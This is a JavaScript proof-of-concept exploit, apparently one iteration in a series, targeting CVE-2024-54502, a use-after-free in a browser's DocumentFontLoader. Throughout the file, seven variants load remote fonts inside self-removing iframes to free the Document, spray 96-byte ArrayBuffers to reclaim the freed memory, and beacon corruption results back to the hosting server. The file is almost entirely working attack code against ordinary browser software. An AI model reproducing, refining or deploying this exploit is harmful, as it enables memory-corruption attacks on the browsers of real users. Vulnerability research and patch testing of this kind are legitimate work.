// p280 — DocumentFontLoader UAF via REMOTE font URL + iframe destruction
//
// CVE-2024-54502: fontLoadingTimerFired() accesses m_document after loadDone()
// triggers 'load' event where JS removes the iframe, freeing the Document.
//
// CRITICAL FIX from p265: uses url() fonts NOT local() fonts.
// local() fonts resolve synchronously and NEVER trigger fontLoadingTimerFired.
// Remote fonts go through beginLoadingFontSoon → timer → loadPendingFonts →
// decrementRequestCount (premature!) → loadDone → checkCompleted → 'load' fires
//
// Beacon prefix: V280-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;
  var FONT_URL = BASE + '/minimal.ttf';
  var FONT_URL2 = BASE + '/evil-woff2-valid.woff2';

  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V280-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function BA(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V280-' + tag + '?t=' + Date.now(), false);
      x.send(body || '');
    } catch (e) {}
  }

  BS('BOOT');

  // Spray: allocate objects matching DocumentFontLoader size (~96 bytes)
  function spray96(count) {
    var arr = [];
    for (var i = 0; i < count; i++) {
      var ab = new ArrayBuffer(96);
      var u32 = new Uint32Array(ab);
      u32[0] = 0xDEAD0000 | (i & 0xFFFF);
      u32[1] = 0x41414141;
      u32[2] = 0x42424242;
      for (var j = 3; j < 24; j++) {
        u32[j] = 0xCC000000 | (i << 8) | j;
      }
      arr.push(ab);
    }
    return arr;
  }

  // Phase 0: Prime the HTTP cache with the font files
  // This ensures fonts resolve from cache during fontLoadingTimerFired
  function primeCache(callback) {
    BS('PRIME-START');
    var done = 0;
    var total = 2;

    function check() {
      done++;
      if (done >= total) {
        BS('PRIME-DONE');
        callback();
      }
    }

    // Fetch font as binary to prime HTTP cache
    var x1 = new XMLHttpRequest();
    x1.open('GET', FONT_URL + '?prime=1', true);
    x1.responseType = 'arraybuffer';
    x1.onload = function() { BS('PRIME-TTF-' + x1.status); check(); };
    x1.onerror = function() { BS('PRIME-TTF-ERR'); check(); };
    x1.send();

    var x2 = new XMLHttpRequest();
    x2.open('GET', FONT_URL2 + '?prime=1', true);
    x2.responseType = 'arraybuffer';
    x2.onload = function() { BS('PRIME-WOFF-' + x2.status); check(); };
    x2.onerror = function() { BS('PRIME-WOFF-ERR'); check(); };
    x2.send();
  }

  // Also prime by rendering in main document
  function primeFontRender(callback) {
    BS('RENDER-PRIME-START');
    var style = document.createElement('style');
    style.textContent =
      '@font-face { font-family: "Prime1"; src: url("' + FONT_URL + '"); }\n' +
      '@font-face { font-family: "Prime2"; src: url("' + FONT_URL2 + '"); }';
    document.head.appendChild(style);

    var d1 = document.createElement('div');
    d1.style.fontFamily = 'Prime1';
    d1.textContent = 'PRIME';
    d1.style.position = 'absolute';
    d1.style.left = '-9999px';
    document.body.appendChild(d1);

    var d2 = document.createElement('div');
    d2.style.fontFamily = 'Prime2';
    d2.textContent = 'PRIME';
    d2.style.position = 'absolute';
    d2.style.left = '-9999px';
    document.body.appendChild(d2);

    void d1.offsetWidth;
    void d2.offsetWidth;

    setTimeout(function() {
      BS('RENDER-PRIME-DONE');
      callback();
    }, 2000);
  }

  // ========== Test A: Core UAF — iframe with remote font, window.onload removes it ==========
  // This is the direct CVE-2024-54502 path:
  // 1. iframe loads page with @font-face url()
  // 2. beginLoadingFontSoon arms the timer
  // 3. fontLoadingTimerFired → loadPendingFonts → decrementRequestCount → loadDone
  // 4. loadDone → checkCompleted → checkCallImplicitClose → fires 'load'
  // 5. onload removes iframe → Document freed after loadDone's RefPtr dies
  // 6. fontLoadingTimerFired line 105: m_document.frame() — UAF
  function testA() {
    BS('A-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.name = 'uafA';

      // Create the iframe content with a remote font
      // The srcdoc content will load the font, triggering beginLoadingFontSoon
      var html = '<!doctype html><html><head>' +
        '<style>@font-face { font-family: "UAF_A"; src: url("' + FONT_URL + '?a=' + Date.now() + '"); }' +
        'body { font-family: "UAF_A", sans-serif; }</style>' +
        '</head><body>' +
        '<div style="font-family:UAF_A">TRIGGER FONT LOAD</div>' +
        '<script>' +
        'window.addEventListener("load", function() {' +
        '  try {' +
        '    var fe = window.frameElement;' +
        '    if (fe && fe.parentNode) {' +
        '      fe.parentNode.removeChild(fe);' +
        '    }' +
        '  } catch(e) {}' +
        '});<\/script>' +
        '</body></html>';

      iframe.srcdoc = html;
      document.body.appendChild(iframe);
      BS('A-IFRAME-ADDED');

      // Check after a delay if iframe was destroyed
      setTimeout(function() {
        if (!iframe.parentNode) {
          BS('A-SELF-DESTRUCTED');
          var s = spray96(1000);
          BS('A-SPRAYED-' + s.length);

          // Read back spray to check if we overwrote freed memory
          var hits = 0;
          for (var i = 0; i < s.length; i++) {
            var v = new Uint32Array(s[i]);
            if (v[0] !== (0xDEAD0000 | (i & 0xFFFF))) {
              hits++;
              if (hits <= 3) {
                BA('A-CORRUPT-' + i, 'v0=' + v[0].toString(16) + ' v1=' + v[1].toString(16));
              }
            }
          }
          BS('A-CORRUPT-HITS-' + hits);
        } else {
          BS('A-STILL-ALIVE');
          iframe.parentNode.removeChild(iframe);
        }
      }, 3000);
    } catch (e) {
      BA('A-ERR', e.message);
    }
  }

  // ========== Test B: Force cache hit — load font, wait, then iframe ==========
  // Same as A but ensures font is definitely in HTTP cache by loading it first
  function testB() {
    BS('B-START');
    try {
      // Step 1: Load font in current document to cache it
      var style = document.createElement('style');
      var fontUrl = FONT_URL + '?b=' + Date.now();
      style.textContent = '@font-face { font-family: "UAF_B_PRIME"; src: url("' + fontUrl + '"); }';
      document.head.appendChild(style);

      var div = document.createElement('div');
      div.style.fontFamily = 'UAF_B_PRIME';
      div.textContent = 'CACHE_PRIME';
      div.style.position = 'absolute';
      div.style.left = '-9999px';
      document.body.appendChild(div);
      void div.offsetWidth;
      BS('B-PRIMED');

      // Step 2: After font is cached, create iframe with SAME font URL
      setTimeout(function() {
        BS('B-CREATING-IFRAME');
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';

        // Use same font URL so it resolves from cache
        var html = '<!doctype html><html><head>' +
          '<style>@font-face { font-family: "UAF_B"; src: url("' + fontUrl + '"); }' +
          'body { font-family: "UAF_B"; }</style>' +
          '</head><body>' +
          '<div>CACHED FONT TRIGGER</div>' +
          '<script>' +
          'window.addEventListener("load", function() {' +
          '  try {' +
          '    var fe = window.frameElement;' +
          '    if (fe && fe.parentNode) fe.parentNode.removeChild(fe);' +
          '  } catch(e) {}' +
          '});<\/script>' +
          '</body></html>';

        iframe.srcdoc = html;
        document.body.appendChild(iframe);
        BS('B-IFRAME-ADDED');

        setTimeout(function() {
          if (!iframe.parentNode) {
            BS('B-SELF-DESTRUCTED');
            var s = spray96(1000);
            BS('B-SPRAYED-' + s.length);
            var hits = 0;
            for (var i = 0; i < s.length; i++) {
              var v = new Uint32Array(s[i]);
              if (v[0] !== (0xDEAD0000 | (i & 0xFFFF))) {
                hits++;
                if (hits <= 3) BA('B-CORRUPT-' + i, 'v0=' + v[0].toString(16));
              }
            }
            BS('B-CORRUPT-HITS-' + hits);
          } else {
            BS('B-STILL-ALIVE');
            iframe.parentNode.removeChild(iframe);
          }
        }, 3000);
      }, 2000);
    } catch (e) {
      BA('B-ERR', e.message);
    }
  }

  // ========== Test C: Multiple fonts — more decrementRequestCount calls ==========
  // More fonts = higher chance the last one triggers the full completion path
  function testC() {
    BS('C-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      var css = '';
      var divs = '';
      for (var i = 0; i < 8; i++) {
        var url = FONT_URL + '?c' + i + '=' + Date.now();
        css += '@font-face { font-family: "UAF_C' + i + '"; src: url("' + url + '"); }\n';
        divs += '<div style="font-family:UAF_C' + i + '">FONT' + i + '</div>';
      }

      var html = '<!doctype html><html><head><style>' + css +
        '</style></head><body>' + divs +
        '<script>' +
        'window.addEventListener("load", function() {' +
        '  try {' +
        '    var fe = window.frameElement;' +
        '    if (fe && fe.parentNode) fe.parentNode.removeChild(fe);' +
        '  } catch(e) {}' +
        '});<\/script>' +
        '</body></html>';

      iframe.srcdoc = html;
      document.body.appendChild(iframe);
      BS('C-IFRAME-ADDED');

      setTimeout(function() {
        if (!iframe.parentNode) {
          BS('C-SELF-DESTRUCTED');
          var s = spray96(1000);
          BS('C-SPRAYED');
          var hits = 0;
          for (var i = 0; i < s.length; i++) {
            var v = new Uint32Array(s[i]);
            if (v[0] !== (0xDEAD0000 | (i & 0xFFFF))) hits++;
          }
          BS('C-CORRUPT-HITS-' + hits);
        } else {
          BS('C-STILL-ALIVE');
          iframe.parentNode.removeChild(iframe);
        }
      }, 4000);
    } catch (e) {
      BA('C-ERR', e.message);
    }
  }

  // ========== Test D: Parent-initiated destruction during font.onload ==========
  // Instead of self-destruct, parent monitors iframe and removes it on font ready
  function testD() {
    BS('D-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      var html = '<!doctype html><html><head>' +
        '<style>@font-face { font-family: "UAF_D"; src: url("' + FONT_URL + '?d=' + Date.now() + '"); }' +
        'body { font-family: "UAF_D"; }</style>' +
        '</head><body>' +
        '<div>TRIGGER</div>' +
        '</body></html>';

      iframe.srcdoc = html;

      // When iframe loads, wait briefly then check if font is ready
      iframe.onload = function() {
        BS('D-IFRAME-LOADED');
        try {
          var idoc = iframe.contentDocument;
          if (idoc && idoc.fonts) {
            idoc.fonts.ready.then(function() {
              BS('D-FONTS-READY');
              // Remove iframe during fonts.ready
              if (iframe.parentNode) {
                iframe.parentNode.removeChild(iframe);
                BS('D-REMOVED');
                var s = spray96(1000);
                BS('D-SPRAYED-' + s.length);
              }
            });
          } else {
            BS('D-NO-FONTS-API');
          }
        } catch (e) {
          BA('D-ERR', e.message);
        }
      };

      document.body.appendChild(iframe);
      BS('D-IFRAME-ADDED');

      setTimeout(function() {
        if (!iframe.parentNode) {
          BS('D-CONFIRMED-GONE');
        } else {
          BS('D-TIMEOUT-STILL-ALIVE');
          iframe.parentNode.removeChild(iframe);
        }
      }, 5000);
    } catch (e) {
      BA('D-OUTER-ERR', e.message);
    }
  }

  // ========== Test E: WOFF2 font variant ==========
  // Same as A but with WOFF2 (different parser path, may have different timing)
  function testE() {
    BS('E-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      var html = '<!doctype html><html><head>' +
        '<style>@font-face { font-family: "UAF_E"; src: url("' + FONT_URL2 + '?e=' + Date.now() + '") format("woff2"); }' +
        'body { font-family: "UAF_E"; }</style>' +
        '</head><body>' +
        '<div>WOFF2 TRIGGER</div>' +
        '<script>' +
        'window.addEventListener("load", function() {' +
        '  try {' +
        '    var fe = window.frameElement;' +
        '    if (fe && fe.parentNode) fe.parentNode.removeChild(fe);' +
        '  } catch(e) {}' +
        '});<\/script>' +
        '</body></html>';

      iframe.srcdoc = html;
      document.body.appendChild(iframe);
      BS('E-IFRAME-ADDED');

      setTimeout(function() {
        if (!iframe.parentNode) {
          BS('E-SELF-DESTRUCTED');
          var s = spray96(1000);
          BS('E-SPRAYED');
        } else {
          BS('E-STILL-ALIVE');
          iframe.parentNode.removeChild(iframe);
        }
      }, 3000);
    } catch (e) {
      BA('E-ERR', e.message);
    }
  }

  // ========== Test F: Rapid iframe cycle with remote fonts ==========
  // Create many iframes with remote fonts and destroy them rapidly
  // Increases chance of hitting the timer race window
  function testF() {
    BS('F-START');
    var created = 0;
    var selfDestructed = 0;
    var total = 15;

    for (var i = 0; i < total; i++) {
      (function(idx) {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';

        var html = '<!doctype html><html><head>' +
          '<style>@font-face { font-family: "UAF_F' + idx + '"; src: url("' + FONT_URL + '?f' + idx + '=' + Date.now() + '"); }' +
          'body { font-family: "UAF_F' + idx + '"; }</style>' +
          '</head><body>' +
          '<div>F' + idx + '</div>' +
          '<script>' +
          'window.addEventListener("load", function() {' +
          '  try { var fe = window.frameElement; if (fe && fe.parentNode) fe.parentNode.removeChild(fe); } catch(e) {}' +
          '});<\/script>' +
          '</body></html>';

        iframe.srcdoc = html;
        document.body.appendChild(iframe);
        created++;
      })(i);
    }
    BS('F-CREATED-' + created);

    setTimeout(function() {
      // Count how many self-destructed
      var remaining = document.querySelectorAll('iframe');
      selfDestructed = created - remaining.length;
      BS('F-DESTRUCTED-' + selfDestructed + '-OF-' + created);

      // Spray to reclaim
      var s = spray96(2000);
      BS('F-SPRAYED-' + s.length);

      // Check for corruption
      var hits = 0;
      for (var i = 0; i < s.length; i++) {
        var v = new Uint32Array(s[i]);
        if (v[0] !== (0xDEAD0000 | (i & 0xFFFF))) {
          hits++;
          if (hits <= 5) BA('F-CORRUPT-' + i, 'v0=' + v[0].toString(16));
        }
      }
      BS('F-CORRUPT-HITS-' + hits);

      // Clean up any remaining iframes
      for (var j = remaining.length - 1; j >= 0; j--) {
        if (remaining[j].name && remaining[j].name.indexOf('uaf') >= 0) continue;
        try { remaining[j].parentNode.removeChild(remaining[j]); } catch(e) {}
      }
    }, 5000);
  }

  // ========== Test G: document.write with remote font (sync parse path) ==========
  function testG() {
    BS('G-START');
    try {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);

      var idoc = iframe.contentDocument;
      idoc.open();
      idoc.write('<!doctype html><html><head>');
      idoc.write('<style>@font-face { font-family: "UAF_G"; src: url("' + FONT_URL + '?g=' + Date.now() + '"); }');
      idoc.write('body { font-family: "UAF_G"; }</style>');
      idoc.write('</head><body>');
      idoc.write('<div style="font-family:UAF_G">DOC WRITE TRIGGER</div>');
      idoc.write('<script>window.addEventListener("load", function() {');
      idoc.write('  try { var fe = window.frameElement; if (fe && fe.parentNode) fe.parentNode.removeChild(fe); } catch(e) {}');
      idoc.write('});<\/script>');
      idoc.write('</body></html>');
      idoc.close();
      BS('G-DOC-WRITTEN');

      setTimeout(function() {
        if (!iframe.parentNode) {
          BS('G-SELF-DESTRUCTED');
          var s = spray96(1000);
          BS('G-SPRAYED');
        } else {
          BS('G-STILL-ALIVE');
          iframe.parentNode.removeChild(iframe);
        }
      }, 3000);
    } catch (e) {
      BA('G-ERR', e.message);
    }
  }

  // Run everything
  primeCache(function() {
    primeFontRender(function() {
      BS('TESTS-START');
      testA();
      setTimeout(testB, 500);
      setTimeout(testC, 6000);
      setTimeout(testD, 11000);
      setTimeout(testE, 17000);
      setTimeout(testF, 21000);
      setTimeout(testG, 28000);
      setTimeout(function() { BS('ALL-DONE'); }, 35000);
    });
  });

})();
